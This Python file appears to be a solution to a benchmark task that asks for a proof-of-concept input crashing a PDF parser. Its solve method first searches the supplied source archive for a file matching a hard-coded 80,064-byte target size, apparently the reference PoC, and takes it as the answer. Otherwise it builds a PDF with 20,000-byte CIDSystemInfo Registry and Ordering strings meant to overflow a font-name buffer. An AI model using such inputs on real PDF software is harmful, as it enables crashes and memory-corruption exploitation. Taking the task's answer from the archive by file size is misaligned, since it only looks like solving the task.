import tarfile
import zipfile
import io


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = None

        # Try as tar archive
        try:
            with tarfile.open(src_path, "r:*") as tar:
                data = self._find_poc_in_tar(tar)
        except Exception:
            data = None

        # If not tar or PoC not found, try as zip archive
        if data is None:
            try:
                with zipfile.ZipFile(src_path, "r") as zf:
                    data = self._find_poc_in_zip(zf)
            except Exception:
                data = None

        if data is None:
            data = self._generate_fallback_poc()

        return data

    def _find_poc_in_tar(self, tar) -> bytes | None:
        desired_size = 80064

        best_exact_pdf = None
        best_exact_any = None
        best_pdf = None
        best_pdf_delta = None
        best_other = None

        try:
            members = tar.getmembers()
        except Exception:
            return None

        for m in members:
            try:
                if not m.isfile() or m.size <= 0:
                    continue

                is_pdf = False
                f = tar.extractfile(m)
                if f is None:
                    continue
                header = f.read(8)
                if header.startswith(b"%PDF-"):
                    is_pdf = True

                if m.size == desired_size:
                    if is_pdf and best_exact_pdf is None:
                        best_exact_pdf = m
                    if best_exact_any is None:
                        best_exact_any = m

                if is_pdf:
                    if m.size == desired_size:
                        continue
                    delta = abs(m.size - desired_size)
                    if best_pdf is None or delta < best_pdf_delta:
                        best_pdf = m
                        best_pdf_delta = delta

                # Track a fallback candidate: largest file under some cap
                if best_other is None or m.size > best_other.size:
                    best_other = m
            except Exception:
                continue

        target = None
        if best_exact_pdf is not None:
            target = best_exact_pdf
        elif best_exact_any is not None:
            target = best_exact_any
        elif best_pdf is not None:
            target = best_pdf
        elif best_other is not None:
            target = best_other

        if target is not None:
            try:
                f = tar.extractfile(target)
                if f is not None:
                    data = f.read()
                    if data:
                        return data
            except Exception:
                return None

        return None

    def _find_poc_in_zip(self, zf) -> bytes | None:
        desired_size = 80064

        best_exact_pdf = None
        best_exact_any = None
        best_pdf = None
        best_pdf_delta = None
        best_other = None

        try:
            infos = zf.infolist()
        except Exception:
            return None

        for info in infos:
            try:
                # Skip directories
                is_dir = getattr(info, "is_dir", None)
                if callable(is_dir):
                    if info.is_dir():
                        continue
                else:
                    if info.filename.endswith("/"):
                        continue

                if info.file_size <= 0:
                    continue

                is_pdf = False
                with zf.open(info, "r") as f:
                    header = f.read(8)
                    if header.startswith(b"%PDF-"):
                        is_pdf = True

                if info.file_size == desired_size:
                    if is_pdf and best_exact_pdf is None:
                        best_exact_pdf = info
                    if best_exact_any is None:
                        best_exact_any = info

                if is_pdf:
                    if info.file_size == desired_size:
                        continue
                    delta = abs(info.file_size - desired_size)
                    if best_pdf is None or delta < best_pdf_delta:
                        best_pdf = info
                        best_pdf_delta = delta

                if best_other is None or info.file_size > best_other.file_size:
                    best_other = info
            except Exception:
                continue

        target = None
        if best_exact_pdf is not None:
            target = best_exact_pdf
        elif best_exact_any is not None:
            target = best_exact_any
        elif best_pdf is not None:
            target = best_pdf
        elif best_other is not None:
            target = best_other

        if target is not None:
            try:
                with zf.open(target, "r") as f:
                    data = f.read()
                    if data:
                        return data
            except Exception:
                return None

        return None

    def _generate_fallback_poc(self) -> bytes:
        buf = io.BytesIO()
        w = buf.write

        # PDF header
        w(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")

        offsets = []

        def add_obj(num: int, content: bytes) -> None:
            offsets.append(buf.tell())
            w(("%d 0 obj\n" % num).encode("ascii"))
            w(content)
            if not content.endswith(b"\n"):
                w(b"\n")
            w(b"endobj\n")

        # Objects
        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>\n")
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n")
        add_obj(
            3,
            b"<< /Type /Page /Parent 2 0 R "
            b"/MediaBox [0 0 612 792] "
            b"/Resources << /Font << /F1 5 0 R >> >> "
            b"/Contents 4 0 R >>\n",
        )

        stream = b"BT /F1 12 Tf 100 700 Td (Hello) Tj ET\n"
        content4 = (
            b"<< /Length %d >>\nstream\n%sendstream\n"
            % (len(stream), stream)
        )
        add_obj(4, content4)

        add_obj(
            5,
            b"<< /Type /Font /Subtype /Type0 "
            b"/BaseFont /AAAAAA "
            b"/Encoding /Identity-H "
            b"/DescendantFonts [6 0 R] >>\n",
        )

        add_obj(
            6,
            b"<< /Type /Font /Subtype /CIDFontType2 "
            b"/BaseFont /BBBBBB "
            b"/CIDSystemInfo 7 0 R "
            b"/W [0 [500]] >>\n",
        )

        # Large Registry and Ordering strings to stress the fallback name buffer
        big_registry = b"A" * 20000
        big_ordering = b"B" * 20000
        cid_dict = (
            b"<< /Registry (%s) /Ordering (%s) /Supplement 0 >>\n"
            % (big_registry, big_ordering)
        )
        add_obj(7, cid_dict)

        num_objs = 7
        xref_pos = buf.tell()
        w(b"xref\n")
        w(("0 %d\n" % (num_objs + 1)).encode("ascii"))
        w(b"0000000000 65535 f \n")
        for off in offsets:
            w(("%010d 00000 n \n" % off).encode("ascii"))

        w(b"trailer\n")
        w(("<< /Size %d /Root 1 0 R >>\n" % (num_objs + 1)).encode("ascii"))
        w(b"startxref\n")
        w(("%d\n" % xref_pos).encode("ascii"))
        w(b"%%EOF\n")

        return buf.getvalue()